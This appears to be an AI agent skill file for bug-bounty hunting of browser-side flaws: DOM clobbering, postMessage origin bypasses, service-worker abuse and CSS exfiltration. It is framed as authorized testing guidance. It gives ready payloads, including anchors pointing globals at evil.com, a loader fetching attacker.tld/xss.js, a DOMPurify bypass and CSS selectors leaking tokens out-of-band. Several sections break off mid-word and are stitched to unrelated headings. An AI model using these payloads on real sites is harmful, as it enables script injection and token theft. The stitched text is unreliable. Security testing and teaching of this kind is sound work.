---
name: bbhunt-dom
description: "Hunt DOM clobbering, postMessage hijacking, service-worker abuse and CSS injection/exfiltration. Unified from 2 upstream skills (cbh, hunting). For authorized security testing only."
agent_created: true
---

# Client-side DOM vulnerability hunting — unified methodology

> **Unified skill.** Built from 2 upstream skills across cbh, hunting. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Web-Research Methodology Additions (2026)

Research basis: HackTricks "DOM Clobbering" (full primitive catalog, DOMPurify `cid:` bypass, HTMLCollection-backed config clobbering) and PortSwigger Web Security Academy "Controlling the web message source" (postMessage origin-verification failures). These deepen the existing phases; they don't replace them.

### A. Discovery checklist — concrete places, params, headers, flows to look

- **Clobberable element set:** only `embed`, `form`, `iframe`, `img`/`image`, `object` can contribute a `name`-based global. `id` on any element contributes a named property on `window`/`document` — duplicate `id`s create an `HTMLCollection`.
- **Dangerous read patterns:** `window.someObject || {}` where the object is later fed to `script.src`, `iframe.src`, `fetch()`, a redirect, or `innerHTML`. Also `document.cookie`, `document.body`, `document.children`, `document.querySelector`, and `getElementById` results.
- **Overriding `getElementById`/`querySelector`:** inject `<html id="X">` or `<body id="X">` with the same id as a hidden legit element; inside SVG use `<foreignobject><html id="X">`, or `<svg><body id="X">` for Chrome/Firefox. Use CSS to hide surrounding text so `innerText` is clean.
- **Attribute clobbering against sanitizers:** filters looping over `.attributes` can be broken by `<form id=x><input id=attributes>`; `nodeName`, `tagName`, `parentNode` are clobberable too.
- **Form hijacking:** the `form="other-form-id"` attribute adds hidden fields and submit buttons to an existing form (`formaction`, `formmethod`).
- **postMessage surface:** `addEventListener('message', ...)` / `onmessage`, where `event.data` flows to `innerHTML`/`eval`/`location`/script src; and senders calling `postMessage(secret, '*')`. Audit `indexOf`/`startsWith`/`endsWith`/`includes`/prefix-regex checks.
- **DOMPurify:** check version; the `cid:` protocol trick and mXSS/clobbering bypasses are version-sensitive.
- 

### Signals and surfaces

### Crown Jewel Targets

DOM-based attacks execute in the victim's browser — the server often never sees the payload, so WAFs and server-side input filters do not apply. PostMessage missing-origin-check = cross-origin token theft with no XSS needed.

**Highest-value chains:**
- **DOM Clobbering → DOM-XSS / auth bypass** — HTML *markup* injection (no `<script>`) overwrites a JS global like `window.config` or shadows `document.getElementById`, and the app later treats that value as a URL/code → sink fires under a markup-only injection where script is filtered.
- **PostMessage no origin check → session theft / DOM-XSS** — a `message` handler that trusts `event.data` without validating `event.origin` lets an attacker iframe/opener drive privileged actions or feed a sink.
- **Service Worker abuse** — register a **same-origin** SW script (reachable because of an upload / open-redirect / path the target serves) via stored XSS → intercept all in-scope `fetch` → persistent credential capture.
- **CSS Exfil** — attribute-value selectors (`input[value^="a"]`) leak a CSRF token / API key / nonce char-by-char to an OOB host with zero JS.

### Attack Surface Signals

```
# Injection points that allow MARKUP but may strip <script>:
user bio / display name / comment / markdown preview / SVG upload / CMS rich-text

# postMessage endpoints (iframes, SSO widgets, payment frames, chat widgets):
*/sso/*  */embed/*  */widget/*  */oauth/*  /sdk.js  pay/checkout iframes

# Service worker presence:
/sw.js  /service-worker.js  /firebase-messaging-sw.js  /ngsw-worker.js (Angular)

# CSS injection points:
?theme=  custom-css profile field  email-template editor  style= passthrough
```

---

### Techniques, payloads and bypasses

### Phase 1 — DOM Clobbering

```bash
# Signal: app reads element IDs/names as if they were JS objects, OR feeds a
# clobberable global into a sink (location, innerHTML, eval, script.src).
# Inject MARKUP (no script) at a sink that lets named/id'd elements through.

# Single-level clobber of window.config:
#   <a id="config" href="https://evil.com">
# Clobber a NON-built-in global the app reads (built-in methods like getElementById can't be shadowed this way):
#   <a id="config"></a><a id="config" name="url">   # window.config.url resolves to an attacker-controlled element/string
# Clobber a string-coerced URL value (anchor toString() == href):
#   <a id="x"></a><a id="x" name="y" href="https://evil.com">   # x.y -> href
# Nested window.a.b.c via form/inputs:
#   <form id="a"><input id="b" name="c" value="clobbered"></form>
# baseURI / relative-URL hijack:
#   <base href="https://evil.com/">      # bends every relative src/href
```

```javascript
// Browser console: find globals that are clobberable AND reach a sink.
// A var only matters if the app later concatenates it into a URL/HTML/eval.
const susp = ['config','settings','options','appConfig','init','data','user',
  'token','csrf','nonce','baseUrl','apiUrl','cdn','redirect','next','debug'];
susp.forEach(k => {
  const v = window[k];
  // HTMLCollection / element => already clobbered or clobberable namespace
  if (v && (v instanceof Element || v instanceof HTMLCollection))
    console.log('[CLOBBERED/NAMESPACE]', k, v);
  else if (v !== undefined) console.log('[GLOBAL]', k, '=', v);
});
```

```bash
# Source review: fin

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **String coercion via anchor:** `<a id=x href="controlled string"></a>` — `x` stringifies to its `href`, unlike a form which stringifies to `[object HTMLFormElement]`. This is what makes URL sinks exploitable.
- **Nested properties:** `x.y` via two same-id anchors with `name="y"`; `x.y.z` via `<form id=x name=y><input id=z value="controlled"></form>` plus a second `<form id=x>`; deeper paths via `iframe srcdoc` chains, using `@import "https://..."` to give the iframe time to render (otherwise `undefined`).
- **HTMLCollection config clobbering — remote script loader:**
  `<a id="PixelAnalyticsConfig"></a><a id="PixelAnalyticsConfig" name="enabled"></a><a id="PixelAnalyticsConfig" name="scriptUrl" href="https://attacker.tld/xss.js"></a>`
  The app's `window.PixelAnalyticsConfig || {}` becomes truthy, `.enabled` truthy, and `script.src = config.scriptUrl` coerces the anchor to its `href`, loading attacker JS. Works whenever code checks truthiness rather than types and CSP permits the origin.
- **DOMPurify `cid:` bypass (PortSwigger lab shape):** `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">` — DOMPurify does not URL-encode double quotes in `cid:`, so the `&quot;` decodes at runtime and escapes the attribute into an `onerror` handler.
- **postMessage weak checks:** `e.origin.indexOf('target.com')>-1` → `https://target.com.attacker.tld`; `endsWith('target.com')` → `https://malicioustarget.com`; prefix regex `/^https:\/\/payments\.example\.com/` → `payments.

### Validation and proof

### Validation (false-positive discipline)

Match the repo standard: a technique that *fires in DevTools* is not a finding until impact is **OOB-confirmed** and **state-proven**.

- **DOM Clobbering** — show the clobbered value actually reaching a sink (XSS payload executes, or app navigates/loads from attacker URL). A clobberable global that never reaches a sink = no impact, do not report.
- **PostMessage** — distinguish a *missing* check from a *weak* one; bypass weak checks from a look-alike origin and capture via OOB. A noisy `message` log alone is not proof — show the privileged action or token exfil.
- **CSS exfil** — **OOB callback per correct character is the only proof.** Read CSP first: `img-src`/`style-src`/`connect-src`/`default-src` restricting external origins kills it. A blocked `url()` is indistinguishable from success in the Network tab — confirm on the Collaborator side.
- **Service Worker** — registration must be **same-origin script**; a `SecurityError` means you cited the wrong origin. Prove *persistence* (close tabs → reopen → fresh OOB hit, no XSS re-fire).
- **General** — unique per-test markers (`btoa(domain)+nonce`) so an OOB hit is attributable to YOUR payload and not background traffic; body-diff the rendered DOM, not the raw HTML, since these are client-side.

**Severity:**
- Same-origin Service Worker → persistent credential intercept: **Critical**
- PostMessage data → DOM-XSS / token theft → ATO: **High–Critical**
- DOM Clobbering → DOM-XSS reaching auth/session: **High**
- CSS exfil of CSRF token (OOB-proven) → CSRF: **Medium** (raise if the 

### C. Validation / proof bar — how to confirm and avoid false positives

- **Clobbering:** a clobberable global that never reaches a sink is not a finding. Show the clobbered value actually reaching `script.src`/`location`/`innerHTML` and executing or navigating. Check `script-src` CSP — if the attacker origin is blocked, say so.
- **postMessage:** distinguish *missing* from *weak* origin checks; prove the weak one by serving from a look-alike/null origin and capturing a privileged action or token via OOB. A noisy message log alone is not proof.
- **Self-XSS:** must show a second principal (victim/admin) rendering the stored payload, via IDOR or shared-object access.
- **CSS exfil / SW (existing phases):** OOB callback per character and same-origin script registration remain the proof bars; re-read CSP before claiming either.
- **General:** body-diff the **rendered DOM**, not raw HTML; use unique per-test canaries (`btoa(domain)+nonce`) so OOB hits are attributable. Cite research as technique provenance only — your live PoC is the evidence.

- **Rendered-DOM diff:** capture `document.body.innerHTML` before/after, not just the raw response — these payloads are client-side.
- **Sink-reaching proof:** for a clobbered config, show the actual network request to attacker JS or the navigation, not just that `window.X` is an HTMLCollection.
- **CSP check:** read `script-src`/`img-src`/`connect-src` before claiming clobbering-loaded JS or CSS exfil; a locked-down CSP kills both.
- **postMessage proof:** show the privileged action or token exfil via OOB, and show the request origina

### Escalation and related chains

### Chain Table

| DOM finding | Chain to | Impact |
|-------------|----------|--------|
| DOM Clobbering → clobbered URL into `script.src`/`location` | DOM-XSS under markup-only injection | High / auth bypass |
| PostMessage no/weak origin check (listener) | data → innerHTML/eval/location sink | DOM-XSS → ATO |
| PostMessage `targetOrigin:'*'` sender | any framing page reads token/auth code | Cross-origin token theft |
| CSS exfil (OOB-confirmed) | leak CSRF token → fire CSRF | CSRF chain (Medium+) |
| Same-origin Service Worker via XSS | intercept all in-scope fetch + auth headers | Persistent ATO (Critical) |
| dangerouslySetInnerHTML, no sanitizer | stored DOM-XSS | XSS → ATO |

---

### Tools and wordlists

### Tools

```bash
# DOM Invader (built into Burp browser) — sources→sinks, postMessage logger, clobbering scanner
# postMessage-tracker — Chrome extension logging cross-window messages
# Burp Collaborator / interactsh / request-bin — MANDATORY OOB sink for CSS-exfil & SW PoCs
# Verify any tool URL before citing it in a report; do not paste unverified repo links.
```

---

## Source skills merged into this topic

- `hunting` — `dom`
- `cbh` — `hunt-dom`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `bbhunt-methodology` — orchestrator, state machine and class router
